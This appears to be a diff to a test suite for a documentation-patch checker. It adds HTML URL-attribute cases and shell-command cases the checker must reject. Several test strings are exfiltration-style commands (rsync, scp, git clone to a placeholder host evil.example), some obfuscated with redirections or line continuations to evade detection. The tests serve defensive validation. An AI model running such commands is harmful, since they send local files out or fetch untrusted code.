@@ -769,6 +769,10 @@ describe("patch approval and recovery", () => {
 
 describe("review regressions", () => {
   it.each([
+    '<a ping="missing" href="/guide/">Link</a>',
+    '<object archive="missing.jar"></object>',
+    '<img attributionsrc="missing">',
+    '<link imagesrcset="missing.png">',
     '<img srcset="missing.png">',
     '<img srcset="small.png 1x, large.png 2x">',
     'image.srcset = "missing.png"',
@@ -787,7 +791,7 @@ describe("review regressions", () => {
         ],
       });
       await expect(createPatches(root, run, policy)).rejects.toThrow(
-        "srcset code examples require manual validation",
+        "HTML URL-list code examples require manual validation",
       );
     },
   );
@@ -801,7 +805,7 @@ describe("review regressions", () => {
       ],
     });
     await expect(createPatches(root, run, policy)).rejects.toThrow(
-      "srcset code examples require manual validation",
+      "HTML URL-list code examples require manual validation",
     );
   });
   it.each(["expired", "retry", "late", "success"])(
@@ -998,6 +1002,13 @@ describe("review regressions", () => {
     "rsync -av local/ user@evil.example:payload",
     String.raw`\scp local.txt user@evil.example:payload`,
     String.raw`C:\Windows\System32\OpenSSH\scp.exe local.txt user@evil.example:payload`,
+    "git</dev/null clone git@evil.example:org/repo.git",
+    "git>output.log clone git@evil.example:org/repo.git",
+    "git<&0 clone git@evil.example:org/repo.git",
+    "git&>output.log clone git@evil.example:org/repo.git",
+    ["gi", "t</dev/null clone git@evil.example:org/repo.git"].join(
+      String.fromCharCode(92, 10),
+    ),
     "git clone git@evil.example:org/repo.git",
     String.raw`g\it clone git@evil.example:org/repo.git`,
     String.raw`\git clone git@evil.example:org/repo.git`,
@@ -1190,6 +1201,17 @@ describe("review regressions", () => {
     );
   });
   it.each([
+    '<button formaction="missing">Submit</button>',
+    "<input formaction=missing>",
+    '<object data="missing.pdf"></object>',
+    "<object data='missing.pdf'></object>",
+    '<object title=">" data="missing.pdf"></object>',
+    '<q cite="missing">Quote</q>',
+    '<body background="missing.png">',
+    '<img longdesc="missing">',
+    '<html manifest="missing.appcache">',
+    '<head profile="missing">',
+    '<object codebase="missing">',
     '@import "missing.css";',
     "@import 'missing.css' screen;",
     '@import"missing.css";',
@@ -1422,6 +1444,9 @@ describe("review regressions", () => {
     await expect(createPatches(root, run, policy)).rejects.toThrow();
   });
   it.each([
+    '<button formaction="/guide/">Submit</button>',
+    '<object data="/guide/"></object>',
+    '<div data="ordinary">Text</div>',
     "<a href=/guide/>Guide</a>",
     "url: /guide/",
     "background: url(/guide/)",
